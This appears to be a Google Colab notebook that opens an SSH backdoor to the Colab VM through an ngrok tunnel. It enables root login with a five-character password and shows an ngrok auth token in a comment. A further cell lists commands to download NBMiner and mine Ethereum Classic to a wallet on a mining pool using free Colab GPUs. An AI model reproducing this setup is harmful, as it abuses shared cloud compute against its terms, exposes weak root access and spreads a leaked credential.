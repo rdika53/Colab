{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled1.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyNUB686Z89KsqTeI2QaWYpD",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/rdika53/Colab/blob/main/ETC.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "cellView": "form",
        "id": "JsjnR32UuNS4"
      },
      "outputs": [],
      "source": [
        "#@title **SSH Ngrok**\n",
        "#@markdown Jika Error, Jalankan ulang scriptnya dari awal\n",
        "#@markdown NGROK TOken 1ycCD1Xvf8VbAgingkJjQlx4u80_2ZNMq3g8iPwaAL6B9Z8HN\n",
        "import random, string, urllib.request, json, getpass\n",
        "password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(5))\n",
        "! wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\n",
        "! unzip -qq -n ngrok-stable-linux-amd64.zip\n",
        "! apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null\n",
        "! echo root:$password | chpasswd\n",
        "! mkdir -p /var/run/sshd\n",
        "! echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n",
        "! echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\n",
        "! echo \"LD_LIBRARY_PATH=/usr/lib64-nvidia\" >> /root/.bashrc\n",
        "! echo \"export LD_LIBRARY_PATH\" >> /root/.bashrc\n",
        "get_ipython().system_raw('/usr/sbin/sshd -D &')\n",
        "print(\"Copy authtoken from https://dashboard.ngrok.com/auth\")\n",
        "authtoken = getpass.getpass()\n",
        "get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')\n",
        "with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:\n",
        "  data = json.loads(response.read().decode())\n",
        "  (host, port) = data['tunnels'][0]['public_url'][6:].split(':')\n",
        "  print(f'ssh -p{port} root@{host}')\n",
        "print(f'{password}')"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "sudo apt install screen\n",
        "\n",
        "mkdir etcm && cd etcm\n",
        "\n",
        "wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz\n",
        "\n",
        "tar xf NBMiner_40.1_Linux.tgz\n",
        "\n",
        "cd NBMiner_40.1_Linux\n",
        "\n",
        "screen\n",
        "\n",
        "nbminer -a etchash -o asia-etc.2miners.com:1010 -u 0xaed0c0eac953da290fcb3e450836e44111795865.Colabz\n",
        "\n"
      ],
      "metadata": {
        "id": "yh2Ata8zfqpT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "n6rn3YaGc3Jz"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}